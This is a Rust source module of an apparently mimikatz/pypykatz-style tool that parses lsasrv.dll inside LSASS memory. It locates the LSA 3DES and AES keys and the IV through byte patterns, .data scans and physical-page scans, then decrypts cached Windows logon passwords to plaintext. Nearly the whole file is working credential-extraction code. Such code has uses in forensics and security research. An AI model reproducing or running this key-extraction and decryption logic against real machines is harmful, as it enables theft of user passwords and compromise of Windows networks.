use aes::Aes128;
use cbc::cipher::{BlockDecryptMut, KeyIvInit};
use des::TdesEde3;

use crate::error::{GovmemError, Result};
use crate::lsass::patterns;
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

type Aes128CbcDec = cbc::Decryptor<Aes128>;
type Des3CbcDec = cbc::Decryptor<TdesEde3>;

/// Extracted crypto keys from lsasrv.dll.
#[derive(Debug)]
pub struct CryptoKeys {
    pub iv: Vec<u8>,
    pub des_key: Vec<u8>,
    pub aes_key: Vec<u8>,
}

/// Offset sets for different Windows builds.
/// Each set: (iv_disp_offset, des_disp_offset, aes_disp_offset) relative to pattern start.
/// Based on pypykatz LSA templates.
const KEY_OFFSET_SETS: &[(i64, i64, i64)] = &[
    (67, -89, 16), // LSA_x64_6: Win10 1809+ / Win11
    (61, -73, 16), // LSA_x64_5: Win10 1507-1607
    (71, -89, 16), // LSA_x64_9: Win11 22H2+
    (58, -89, 16), // LSA_x64_8: Win11 early
    (62, -74, 23), // LSA_x64_3: Win8.1 / Server 2012 R2
    (59, -61, 23), // LSA_x64_1: Win7 / Server 2008 R2
    (62, -70, 23), // LSA_x64_2: Win8 / Server 2012
];

/// Extract IV, 3DES key, and AES key from lsasrv.dll.
///
/// Uses pypykatz-compatible offsets from the key initialization pattern:
///   - The pattern ends with `48 8D 15` (LEA RDX, [rip+disp32]) → hAesKey reference
///   - IV reference is at a specific offset AFTER the pattern start
///   - h3DesKey reference is at a specific offset BEFORE the pattern start
pub fn extract_crypto_keys(
    vmem: &impl VirtualMemory,
    lsasrv_base: u64,
    _lsasrv_size: u32,
) -> Result<CryptoKeys> {
    let pe = PeHeaders::parse_from_memory(vmem, lsasrv_base)?;

    let text = pe
        .find_section(".text")
        .ok_or_else(|| GovmemError::PatternNotFound(".text section in lsasrv.dll".to_string()))?;

    let text_base = lsasrv_base + text.virtual_address as u64;
    let text_size = text.virtual_size;

    log::info!(
        "lsasrv PE: base=0x{:x}, .text VA=0x{:x}, .text size=0x{:x}, text_base=0x{:x}",
        lsasrv_base,
        text.virtual_address,
        text_size,
        text_base
    );

    // Find the key initialization pattern
    let pattern_result = patterns::find_pattern(
        vmem,
        text_base,
        text_size,
        patterns::LSASRV_KEY_PATTERNS,
        "lsasrv_key_init",
    );

    let (pattern_addr, _pat_idx) = match pattern_result {
        Ok(result) => result,
        Err(e) => {
            log::info!(
                "Key pattern not found in .text ({}), trying .data section fallback...",
                e
            );
            return extract_crypto_keys_data_fallback(vmem, lsasrv_base);
        }
    };

    // Try each offset set until one produces valid results
    for (set_idx, &(iv_off, des_off, aes_off)) in KEY_OFFSET_SETS.iter().enumerate() {
        log::info!(
            "Trying offset set {} (IV={}, DES={}, AES={})",
            set_idx,
            iv_off,
            des_off,
            aes_off
        );

        // Resolve RIP-relative addresses for each global
        let iv_addr = match patterns::resolve_rip_relative(vmem, pattern_addr, iv_off) {
            Ok(a) => a,
            Err(_) => continue,
        };
        let des_addr = match patterns::resolve_rip_relative(vmem, pattern_addr, des_off) {
            Ok(a) => a,
            Err(_) => continue,
        };
        let aes_addr = match patterns::resolve_rip_relative(vmem, pattern_addr, aes_off) {
            Ok(a) => a,
            Err(_) => continue,
        };

        log::debug!("  IV global at: 0x{:x}", iv_addr);
        log::debug!("  h3DesKey global at: 0x{:x}", des_addr);
        log::debug!("  hAesKey global at: 0x{:x}", aes_addr);

        // Read IV (16 bytes directly from the global)
        let iv = match vmem.read_virt_bytes(iv_addr, 16) {
            Ok(v) => v,
            Err(_) => continue,
        };
        log::debug!("  IV: {}", hex::encode(&iv));

        // Extract key bytes from BCrypt handle chain
        let des_key = match extract_bcrypt_key(vmem, des_addr) {
            Ok(k) => k,
            Err(e) => {
                log::info!("  3DES key extraction failed: {}", e);
                continue;
            }
        };
        let aes_key = match extract_bcrypt_key(vmem, aes_addr) {
            Ok(k) => k,
            Err(e) => {
                log::info!("  AES key extraction failed: {}", e);
                continue;
            }
        };

        // Validate key sizes
        if des_key.len() != 24 {
            log::info!("  Invalid 3DES key length: {} (expected 24)", des_key.len());
            continue;
        }
        if aes_key.len() != 16 && aes_key.len() != 32 {
            log::info!(
                "  Invalid AES key length: {} (expected 16 or 32)",
                aes_key.len()
            );
            continue;
        }

        log::info!(
            "Crypto keys extracted: 3DES={} bytes, AES={} bytes",
            des_key.len(),
            aes_key.len()
        );

        return Ok(CryptoKeys {
            iv,
            des_key,
            aes_key,
        });
    }

    // All offset sets failed (likely .data pages paged out → globals read as 0).
    // Fall through to .data section scan which may find handles if some .data pages
    // are accessible (transition PTEs).
    log::info!("All offset sets failed, trying .data section fallback...");
    extract_crypto_keys_data_fallback(vmem, lsasrv_base)
}

/// Fallback: scan lsasrv.dll's .data section for BCrypt key handles.
///
/// The globals h3DesKey, hAesKey, and InitializationVector reside in .data.
/// h3DesKey and hAesKey are pointers to BCRYPT_HANDLE_KEY structs (tag UUUR at +4).
/// The IV is a 16-byte array near these pointers.
///
/// Strategy: scan .data for qwords that look like heap pointers, follow them,
/// check for UUUR tag → MSSK tag chain, extract keys. Then find the IV nearby.
fn extract_crypto_keys_data_fallback(
    vmem: &impl VirtualMemory,
    lsasrv_base: u64,
) -> Result<CryptoKeys> {
    let pe = PeHeaders::parse_from_memory(vmem, lsasrv_base)?;
    let data_sec = pe
        .find_section(".data")
        .ok_or_else(|| GovmemError::PatternNotFound(".data section in lsasrv.dll".to_string()))?;

    let data_base = lsasrv_base + data_sec.virtual_address as u64;
    let data_size = data_sec.virtual_size as usize;

    log::info!(
        "Scanning lsasrv .data section for BCrypt handles: base=0x{:x}, size=0x{:x}",
        data_base,
        data_size
    );

    let data = vmem.read_virt_bytes(data_base, data_size)?;

    // Scan for valid BCrypt key handle pointers in .data
    // Each handle global is a qword pointing to a BCRYPT_HANDLE_KEY on the heap.
    // BCRYPT_HANDLE_KEY has tag 0x52555555 ("UUUR") at offset +4.
    const UUUR_TAG: u32 = 0x5555_5552;
    let mut key_handles: Vec<(u64, Vec<u8>)> = Vec::new(); // (data_offset, key_bytes)

    for off in (0..data_size.saturating_sub(8)).step_by(8) {
        let ptr = u64::from_le_bytes(data[off..off + 8].try_into().unwrap());

        // Quick filter: must look like a heap pointer (user-mode, non-zero, aligned)
        if ptr == 0 || ptr < 0x10000 || ptr & 0x7 != 0 {
            continue;
        }
        let high = ptr >> 48;
        if high != 0 && high != 0xFFFF {
            continue;
        }

        // Try to read BCRYPT_HANDLE_KEY tag at ptr+4
        let tag = match vmem.read_virt_u32(ptr + 4) {
            Ok(t) => t,
            Err(_) => continue,
        };
        if tag != UUUR_TAG {
            continue;
        }

        // Follow the key pointer at handle+0x10
        let _key_ptr = match vmem.read_virt_u64(ptr + 0x10) {
            Ok(p) if p > 0x10000 => p,
            _ => continue,
        };

        // Try to extract key bytes via the existing logic
        let handle_addr = data_base + off as u64;
        if let Ok(key_bytes) = extract_bcrypt_key(vmem, handle_addr) {
            log::info!(
                "Found BCrypt key handle at .data+0x{:x} (VA 0x{:x}): {} bytes",
                off,
                handle_addr,
                key_bytes.len()
            );
            key_handles.push((off as u64, key_bytes));
        }
    }

    if key_handles.len() < 2 {
        return Err(GovmemError::PatternNotFound(format!(
            "Found only {} BCrypt handles in .data (need 2 for 3DES+AES)",
            key_handles.len()
        )));
    }

    // Identify 3DES (24 bytes) and AES (16 or 32 bytes) keys
    let mut des_key: Option<Vec<u8>> = None;
    let mut aes_key: Option<Vec<u8>> = None;
    let mut handle_offsets: Vec<u64> = Vec::new();

    for (off, key) in &key_handles {
        handle_offsets.push(*off);
        if key.len() == 24 && des_key.is_none() {
            des_key = Some(key.clone());
        } else if (key.len() == 16 || key.len() == 32) && aes_key.is_none() {
            aes_key = Some(key.clone());
        }
    }

    let des_key = des_key.ok_or_else(|| {
        GovmemError::PatternNotFound("3DES key (24 bytes) not found in .data handles".to_string())
    })?;
    let aes_key = aes_key.ok_or_else(|| {
        GovmemError::PatternNotFound("AES key (16/32 bytes) not found in .data handles".to_string())
    })?;

    // Find the IV: it's a 16-byte array in .data, typically near the key handle pointers.
    // The IV is at a .data offset close to (usually before) the key handles.
    // Mimikatz places it at the InitializationVector global.
    // Strategy: look for a 16-byte non-zero region near the first handle that isn't
    // itself a pointer. Scan backwards and forwards from the earliest handle offset.
    let earliest_handle = *handle_offsets.iter().min().expect("checked len >= 2 above");
    let iv = find_iv_near_handles(vmem, &data, data_base, earliest_handle)?;

    log::info!(
        "Crypto keys extracted via .data fallback: 3DES={} bytes, AES={} bytes, IV={}",
        des_key.len(),
        aes_key.len(),
        hex::encode(&iv)
    );

    Ok(CryptoKeys {
        iv,
        des_key,
        aes_key,
    })
}

/// Find the InitializationVector in .data near the BCrypt handle globals.
/// The IV is a 16-byte non-zero, non-pointer array.
fn find_iv_near_handles(
    _vmem: &impl VirtualMemory,
    data: &[u8],
    _data_base: u64,
    handle_offset: u64,
) -> Result<Vec<u8>> {
    let handle_off = handle_offset as usize;

    // Search within ±0x200 of the handle offset, 8-byte aligned
    let search_start = handle_off.saturating_sub(0x200);
    let search_end = (handle_off + 0x200).min(data.len().saturating_sub(16));

    for off in (search_start..search_end).step_by(8) {
        let candidate = &data[off..off + 16];

        // IV should be non-zero
        if candidate.iter().all(|&b| b == 0) {
            continue;
        }

        // Check that the first 8 bytes don't look like a pointer
        let val = u64::from_le_bytes(candidate[0..8].try_into().unwrap());
        if val > 0x10000 && (val >> 48 == 0 || val >> 48 == 0xFFFF) && val & 0x7 == 0 {
            continue; // looks like a pointer, skip
        }

        // Check that the second 8 bytes don't look like a pointer either
        let val2 = u64::from_le_bytes(candidate[8..16].try_into().unwrap());
        if val2 > 0x10000 && (val2 >> 48 == 0 || val2 >> 48 == 0xFFFF) && val2 & 0x7 == 0 {
            continue;
        }

        // Good candidate - should have some entropy (not repeating pattern)
        let unique_bytes: std::collections::HashSet<u8> = candidate.iter().copied().collect();
        if unique_bytes.len() < 4 {
            continue; // too uniform
        }

        log::debug!(
            "IV candidate at .data+0x{:x}: {}",
            off,
            hex::encode(candidate)
        );
        return Ok(candidate.to_vec());
    }

    Err(GovmemError::PatternNotFound(
        "InitializationVector not found near BCrypt handles in .data".to_string(),
    ))
}

/// Extract raw key bytes from a BCrypt key handle global variable.
///
/// Handle chain (BCRYPT_KEY81 for Win 8.1+):
///   handle_addr -> pointer to BCRYPT_HANDLE_KEY
///   BCRYPT_HANDLE_KEY + 0x10 -> pointer to BCRYPT_KEY81
///   BCRYPT_KEY81 + hardkey_offset -> HARD_KEY { cbSecret: u32, data: [u8; cbSecret] }
fn extract_bcrypt_key(vmem: &impl VirtualMemory, handle_addr: u64) -> Result<Vec<u8>> {
    let handle_ptr = vmem.read_virt_u64(handle_addr)?;
    if handle_ptr == 0 || handle_ptr < 0x10000 {
        return Err(GovmemError::DecryptionError(format!(
            "Invalid BCrypt handle pointer: 0x{:x}",
            handle_ptr
        )));
    }
    // Validate canonical address
    let high = handle_ptr >> 48;
    if high != 0 && high != 0xFFFF {
        return Err(GovmemError::DecryptionError(format!(
            "Non-canonical BCrypt handle pointer: 0x{:x}",
            handle_ptr
        )));
    }

    log::debug!("  BCrypt handle ptr: 0x{:x}", handle_ptr);

    // Read BCRYPT_HANDLE_KEY structure
    let handle_tag = vmem.read_virt_u32(handle_ptr + 0x04)?;
    log::debug!(
        "  BCrypt handle tag: 0x{:08x} ('{}')",
        handle_tag,
        tag_to_str(handle_tag)
    );

    // Read key pointer at +0x10 (standard offset for BCRYPT_HANDLE_KEY.key)
    let key_ptr = vmem.read_virt_u64(handle_ptr + 0x10)?;
    if key_ptr == 0 || key_ptr < 0x10000 {
        return Err(GovmemError::DecryptionError(format!(
            "Invalid BCrypt key pointer at handle+0x10: 0x{:x}",
            key_ptr
        )));
    }
    let key_high = key_ptr >> 48;
    if key_high != 0 && key_high != 0xFFFF {
        return Err(GovmemError::DecryptionError(format!(
            "Non-canonical BCrypt key pointer: 0x{:x}",
            key_ptr
        )));
    }

    log::debug!("  BCrypt key ptr: 0x{:x}", key_ptr);

    // Read BCRYPT_KEY / BCRYPT_KEY81 structure
    let key_tag = vmem.read_virt_u32(key_ptr + 0x04)?;
    log::debug!(
        "  BCrypt key tag: 0x{:08x} ('{}')",
        key_tag,
        tag_to_str(key_tag)
    );

    // Try BCRYPT_KEY81 layout (Win 8.1+): hardkey at offset 0x38
    // Then try BCRYPT_KEY layout (older): hardkey at offset 0x18
    for &hardkey_offset in &[0x38u64, 0x18] {
        let cb_secret = vmem.read_virt_u32(key_ptr + hardkey_offset)?;
        if cb_secret == 16 || cb_secret == 24 || cb_secret == 32 {
            let key_data =
                vmem.read_virt_bytes(key_ptr + hardkey_offset + 4, cb_secret as usize)?;
            if key_data.iter().any(|&b| b != 0) {
                log::debug!(
                    "  Found key at key_obj+0x{:x}: {} bytes",
                    hardkey_offset,
                    cb_secret
                );
                return Ok(key_data);
            }
        }
    }

    // Fallback: scan for valid key sizes at common offsets
    for offset in (0x10..0x60u64).step_by(4) {
        let val = vmem.read_virt_u32(key_ptr + offset)?;
        if val == 16 || val == 24 || val == 32 {
            let key_data = vmem.read_virt_bytes(key_ptr + offset + 4, val as usize)?;
            if key_data.iter().any(|&b| b != 0) {
                log::debug!("  Fallback: key at key_obj+0x{:x}: {} bytes", offset, val);
                return Ok(key_data);
            }
        }
    }

    Err(GovmemError::DecryptionError(
        "Could not locate HARD_KEY in BCrypt key structure".to_string(),
    ))
}

/// Physical scan fallback: find BCRYPT_HANDLE_KEY structures directly in LSASS pages.
///
/// When .data section globals are paged out (reading as 0), the actual BCrypt structures
/// on the heap may still be in physical memory (present or transition pages). This function
/// enumerates LSASS pages, finds UUUR-tagged handles, extracts keys, and resolves IV
/// from the pattern-based RIP-relative address.
pub fn extract_crypto_keys_physical_scan<P: crate::memory::PhysicalMemory>(
    phys: &P,
    vmem: &impl VirtualMemory,
    lsass_dtb: u64,
    lsasrv_base: u64,
    _lsasrv_size: u32,
) -> Result<CryptoKeys> {
    use crate::paging::translate::PageTableWalker;

    log::info!("Trying physical UUUR scan for BCRYPT handles in LSASS pages");

    let walker = PageTableWalker::new(phys);
    let mut uuur_vaddrs: Vec<u64> = Vec::new();

    walker.enumerate_present_pages(lsass_dtb, |mapping| {
        if mapping.size != 0x1000 {
            return; // Only scan 4KB pages
        }
        let mut page = [0u8; 4096];
        if phys.read_phys(mapping.paddr, &mut page).is_err() {
            return;
        }
        // Scan for UUUR tag at 8-byte aligned positions
        // BCRYPT_HANDLE_KEY: size(4) + tag(4=UUUR) at the start of the struct
        for offset in (0..4096 - 8).step_by(8) {
            let tag = u32::from_le_bytes(page[offset + 4..offset + 8].try_into().unwrap());
            if tag == 0x5555_5552 {
                // UUUR found
                uuur_vaddrs.push(mapping.vaddr + offset as u64);
            }
        }
    });

    log::info!("Physical scan found {} UUUR candidates", uuur_vaddrs.len());

    if uuur_vaddrs.is_empty() {
        return Err(GovmemError::PatternNotFound(
            "No BCRYPT_HANDLE_KEY (UUUR) found in LSASS pages".to_string(),
        ));
    }

    // Extract keys from UUUR handles via virtual memory (handles transition pages)
    let mut extracted_keys: Vec<(u64, Vec<u8>)> = Vec::new();
    for &handle_va in &uuur_vaddrs {
        // BCRYPT_HANDLE_KEY: key pointer at +0x10
        let key_ptr = match vmem.read_virt_u64(handle_va + 0x10) {
            Ok(p) if p > 0x10000 => p,
            _ => continue,
        };

        // Try BCRYPT_KEY81 (hardkey at +0x38) and BCRYPT_KEY (hardkey at +0x18)
        for &hardkey_off in &[0x38u64, 0x18] {
            let cb_secret = match vmem.read_virt_u32(key_ptr + hardkey_off) {
                Ok(cb) if cb == 16 || cb == 24 || cb == 32 => cb,
                _ => continue,
            };
            if let Ok(data) = vmem.read_virt_bytes(key_ptr + hardkey_off + 4, cb_secret as usize) {
                if data.iter().any(|&b| b != 0) {
                    log::info!(
                        "Physical scan: key at UUUR 0x{:x} → key_obj 0x{:x}+0x{:x}: {} bytes",
                        handle_va,
                        key_ptr,
                        hardkey_off,
                        cb_secret,
                    );
                    extracted_keys.push((handle_va, data));
                    break;
                }
            }
        }
    }

    log::info!(
        "Physical scan extracted {} keys from UUUR handles",
        extracted_keys.len()
    );

    if extracted_keys.len() < 2 {
        return Err(GovmemError::PatternNotFound(format!(
            "Physical scan found {} UUUR handles but only {} valid keys (need 2)",
            uuur_vaddrs.len(),
            extracted_keys.len(),
        )));
    }

    // Identify 3DES (24B) and AES (16/32B) keys
    let mut des_key: Option<Vec<u8>> = None;
    let mut aes_key: Option<Vec<u8>> = None;

    for (_, key) in &extracted_keys {
        if key.len() == 24 && des_key.is_none() {
            des_key = Some(key.clone());
        } else if (key.len() == 16 || key.len() == 32) && aes_key.is_none() {
            aes_key = Some(key.clone());
        }
    }

    let des_key = des_key.ok_or_else(|| {
        GovmemError::PatternNotFound("Physical scan: 3DES key (24 bytes) not found".to_string())
    })?;
    let aes_key = aes_key.ok_or_else(|| {
        GovmemError::PatternNotFound("Physical scan: AES key (16/32 bytes) not found".to_string())
    })?;

    // Resolve IV: try pattern-based RIP-relative addresses
    // The IV may be on a different .data page that's accessible even when key globals aren't
    let pe = PeHeaders::parse_from_memory(vmem, lsasrv_base)?;
    let text = pe
        .find_section(".text")
        .ok_or_else(|| GovmemError::PatternNotFound(".text section in lsasrv.dll".to_string()))?;
    let text_base = lsasrv_base + text.virtual_address as u64;
    let text_size = text.virtual_size;

    let pattern_result = patterns::find_pattern(
        vmem,
        text_base,
        text_size,
        patterns::LSASRV_KEY_PATTERNS,
        "lsasrv_key_init",
    );

    let mut iv: Option<Vec<u8>> = None;
    if let Ok((pattern_addr, _)) = pattern_result {
        for &(iv_off, _, _) in KEY_OFFSET_SETS {
            if let Ok(iv_addr) = patterns::resolve_rip_relative(vmem, pattern_addr, iv_off) {
                if let Ok(iv_data) = vmem.read_virt_bytes(iv_addr, 16) {
                    if iv_data.iter().any(|&b| b != 0) {
                        log::info!(
                            "Physical scan: IV at 0x{:x}: {}",
                            iv_addr,
                            hex::encode(&iv_data)
                        );
                        iv = Some(iv_data);
                        break;
                    }
                }
            }
        }
    }

    // If IV not found via pattern, try scanning .data for IV-like data near UUUR handle VAs
    if iv.is_none() {
        if let Some(data_sec) = pe.find_section(".data") {
            let data_base = lsasrv_base + data_sec.virtual_address as u64;
            let data_size = data_sec.virtual_size as usize;
            if let Ok(data) = vmem.read_virt_bytes(data_base, data_size) {
                // Find earliest non-zero 16-byte region that looks like random data (not a pointer)
                for off in (0..data_size.saturating_sub(16)).step_by(8) {
                    let candidate = &data[off..off + 16];
                    if candidate.iter().all(|&b| b == 0) {
                        continue;
                    }
                    let val = u64::from_le_bytes(candidate[0..8].try_into().unwrap());
                    if val > 0x10000 && (val >> 48 == 0 || val >> 48 == 0xFFFF) && val & 0x7 == 0 {
                        continue; // looks like a pointer
                    }
                    let val2 = u64::from_le_bytes(candidate[8..16].try_into().unwrap());
                    if val2 > 0x10000
                        && (val2 >> 48 == 0 || val2 >> 48 == 0xFFFF)
                        && val2 & 0x7 == 0
                    {
                        continue;
                    }
                    let unique: std::collections::HashSet<u8> = candidate.iter().copied().collect();
                    if unique.len() < 4 {
                        continue;
                    }
                    log::info!(
                        "Physical scan: IV candidate at .data+0x{:x}: {}",
                        off,
                        hex::encode(candidate)
                    );
                    iv = Some(candidate.to_vec());
                    break;
                }
            }
        }
    }

    let iv = iv.ok_or_else(|| {
        GovmemError::PatternNotFound(
            "Physical scan: IV not found (all .data pages paged out)".to_string(),
        )
    })?;

    log::info!(
        "Crypto keys extracted via physical UUUR scan: 3DES={} bytes, AES={} bytes",
        des_key.len(),
        aes_key.len()
    );

    Ok(CryptoKeys {
        iv,
        des_key,
        aes_key,
    })
}

fn tag_to_str(tag: u32) -> String {
    let bytes = tag.to_le_bytes();
    bytes
        .iter()
        .map(|&b| {
            if b.is_ascii_alphanumeric() || b == b'_' {
                b as char
            } else {
                '.'
            }
        })
        .collect()
}

/// Decrypt an encrypted credential blob.
///
/// Key selection follows mimikatz C logic:
///   if (BufferSize % 8) → AES (data NOT 8-byte aligned)
///   else → 3DES (data IS 8-byte aligned)
///
/// Note: pypykatz has this logic inverted (bug). The original mimikatz C code
/// uses 3DES for 8-aligned data and AES for non-8-aligned data.
pub fn decrypt_credential(keys: &CryptoKeys, encrypted: &[u8]) -> Result<Vec<u8>> {
    if encrypted.is_empty() {
        return Ok(Vec::new());
    }

    if encrypted.len().is_multiple_of(8) {
        // 3DES-CBC (mimikatz: BufferSize % 8 == 0 → h3DesKey)
        decrypt_3des_cbc(&keys.des_key, &keys.iv[..8], encrypted)
    } else {
        // AES-CBC (mimikatz: BufferSize % 8 != 0 → hAesKey)
        decrypt_aes_cbc(&keys.aes_key, &keys.iv, encrypted)
    }
}

fn decrypt_3des_cbc(key: &[u8], iv: &[u8], data: &[u8]) -> Result<Vec<u8>> {
    if key.len() != 24 {
        return Err(GovmemError::DecryptionError(format!(
            "Invalid 3DES key length: {} (expected 24)",
            key.len()
        )));
    }
    let mut buf = data.to_vec();
    let decryptor = Des3CbcDec::new_from_slices(key, iv)
        .map_err(|e| GovmemError::DecryptionError(format!("3DES init: {}", e)))?;
    decryptor
        .decrypt_padded_mut::<cbc::cipher::block_padding::NoPadding>(&mut buf)
        .map_err(|e| GovmemError::DecryptionError(format!("3DES decrypt: {}", e)))?;
    Ok(buf)
}

/// Base64 encode (standard alphabet, with padding).
pub fn base64_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(data.len().div_ceil(3) * 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;
        out.push(ALPHABET[((triple >> 18) & 0x3F) as usize] as char);
        out.push(ALPHABET[((triple >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            out.push(ALPHABET[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }
        if chunk.len() > 2 {
            out.push(ALPHABET[(triple & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }
    }
    out
}

pub fn decode_utf16_le(data: &[u8]) -> String {
    let u16s: Vec<u16> = data
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .take_while(|&c| c != 0)
        .collect();
    String::from_utf16_lossy(&u16s)
}

pub fn decrypt_unicode_string_password(
    vmem: &impl crate::memory::VirtualMemory,
    ustring_addr: u64,
    keys: &CryptoKeys,
) -> String {
    let pwd_len = vmem.read_virt_u16(ustring_addr).unwrap_or(0) as usize;
    let pwd_ptr = vmem.read_virt_u64(ustring_addr + 8).unwrap_or(0);
    if pwd_len == 0 || pwd_ptr == 0 {
        return String::new();
    }
    let enc_data = match vmem.read_virt_bytes(pwd_ptr, pwd_len) {
        Ok(d) => d,
        Err(_) => return String::new(),
    };
    match decrypt_credential(keys, &enc_data) {
        Ok(decrypted) => decode_utf16_le(&decrypted),
        Err(_) => String::new(),
    }
}

fn decrypt_aes_cbc(key: &[u8], iv: &[u8], data: &[u8]) -> Result<Vec<u8>> {
    if key.len() != 16 && key.len() != 32 {
        return Err(GovmemError::DecryptionError(format!(
            "Invalid AES key length: {} (expected 16 or 32)",
            key.len()
        )));
    }
    let mut buf = data.to_vec();
    let decryptor = Aes128CbcDec::new_from_slices(key, iv)
        .map_err(|e| GovmemError::DecryptionError(format!("AES init: {}", e)))?;
    decryptor
        .decrypt_padded_mut::<cbc::cipher::block_padding::NoPadding>(&mut buf)
        .map_err(|e| GovmemError::DecryptionError(format!("AES decrypt: {}", e)))?;
    Ok(buf)
}
